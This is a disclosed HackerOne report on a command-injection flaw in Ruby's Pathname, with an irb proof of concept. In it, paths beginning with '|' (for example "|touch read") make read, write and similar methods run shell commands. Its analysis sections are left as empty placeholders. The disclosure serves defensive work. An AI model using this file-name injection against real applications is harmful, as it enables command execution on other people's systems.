---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '449482'
original_report_id: '449482'
title: Command injection in Pathname
weakness: Command Injection - Generic
team_handle: ruby
created_at: '2018-11-25T07:57:29.658Z'
disclosed_at: '2019-04-01T11:52:19.817Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 36
tags:
- hackerone
- command-injection-generic
---

# Command injection in Pathname

## Metadata

- HackerOne Report ID: 449482
- Weakness: Command Injection - Generic
- Program: ruby
- Disclosed At: 2019-04-01T11:52:19.817Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The command may be executed when the value passed to Pathname is the first character of "|".
This is the same problem as https://bugs.ruby-lang.org/issues/14245, but here it is executed without warning.

```ruby
$ ruby -v
ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-darwin16]

$ irb
irb(main):001:0> `ls`
=> ""

irb(main):002:0> require 'pathname'
=> true
irb(main):003:0> Pathname("|touch binread").binread
=> ""
irb(main):004:0> Pathname("|touch binwrite").binwrite("")
=> 0
irb(main):005:0> Pathname("|touch each_line").each_line {|v| p v}
=> nil
irb(main):006:0> Pathname("|touch read").read
=> ""
irb(main):007:0> Pathname("|touch readlines").readlines
=> []
irb(main):008:0> Pathname("|touch write").write("")
=> 0

irb(main):009:0> `ls`
=> "binread\nbinwrite\neach_line\nread\nreadlines\nwrite\n"
```

## Impact

The command may be executed unintentionally.

However, this is the same behavior as `IO` and can be inferred from the document.
https://ruby-doc.org/stdlib-2.5.0/libdoc/pathname/rdoc/Pathname.html#class-Pathname-label-IO

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
